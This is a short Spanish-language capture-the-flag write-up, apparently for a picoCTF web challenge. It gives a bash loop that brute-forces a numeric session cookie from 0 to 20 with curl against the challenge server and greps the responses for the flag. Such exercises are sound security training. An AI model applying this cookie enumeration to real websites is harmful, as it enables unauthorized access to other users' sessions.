## Objetivo

## Solución
Podemos ver que al poner un numero nos da una cookie diferente, por lo que podemos hacerlo por fuerza bruta y probar con los número 0 al 20. De eso tomamo las que contengan pico
```
for i in {0..20}; do curl -s http://mercury.picoctf.net:17781/check -H "Cookie: name=$i"; done | grep "pico"

```
## Notas adicionales

## Referencias
